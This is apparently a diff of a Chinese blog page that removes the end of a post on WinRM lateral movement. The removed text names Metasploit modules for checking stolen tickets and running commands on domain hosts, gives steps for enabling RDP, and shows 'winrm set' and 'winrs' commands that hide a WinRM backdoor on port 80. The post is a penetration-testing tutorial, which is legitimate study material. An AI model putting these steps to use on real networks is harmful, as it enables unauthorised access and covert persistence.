-<h3 id="探测票据有效性"><a href="#探测票据有效性" class="headerlink" title="探测票据有效性"></a>探测票据有效性</h3><p>如果已经获得服务器上的缓存票据，则这些票据可用于通过<strong>WinRM</strong>服务与其他主机进行身份验证。以下模块可检测票据是否对其他主机有效。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/winrm/winrm_login </span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192855464.png" alt="image-20210926192855464"></p>
-<h3 id="利用票据执行命令"><a href="#利用票据执行命令" class="headerlink" title="利用票据执行命令"></a>利用票据执行命令</h3><p>通过<strong>WinRM</strong> 服务执行任意命令。此模块需要本地管理员凭据、域和目标主机。</p>
-<p>此处未能成功执行。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/winrm/winrm_cmd</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192903042.png" alt="image-20210926192903042"></p>
-<p>也可利用WinRM和以下模块执行命令。该模块需要本地管理员凭证和代码将执行的主机列表。此模块可用于横向移动到域内主机。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/winrm/winrm_script_exec</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192912391.png" alt="image-20210926192912391"></p>
-<h2 id="其他利用手段"><a href="#其他利用手段" class="headerlink" title="其他利用手段"></a>其他利用手段</h2><p>​    <strong>1.开启3389远程桌面控制</strong></p>
-<p>​    若开启了WinRM,可利用PeekABoo工具或直接对注册表操作开启3389端口</p>
-<p>​    <strong>2.端口复用做后门</strong></p>
-<p>​    将WInRM监听端口由5985改为80或443等常用端口，及时端口被Web服务占用也不会影响，并且不会影响web服务的执行：</p>
-<p>​    （1）配置目标WinRM服务，更改监听端口开启复用模式</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winrm set winrm/config/Listener?Address=*+Transport=HTTP @&#123;Port=&quot;80&quot;&#125;</span><br><span class="line">winrm set winrm/config/service @&#123;EnableCompatibilityHttpListener=&quot;true&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>​    （2）链接目标</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:http://192.168.1.152 -u:administrator -p:xxxx cmd</span><br></pre></td></tr></table></figure>
-
-<p>​    此方法适用于存在web服务的主机，并不会再开启新端口，较为隐蔽。</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
+    <nav id="page-nav">
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+    </nav>
   
 
 </div>
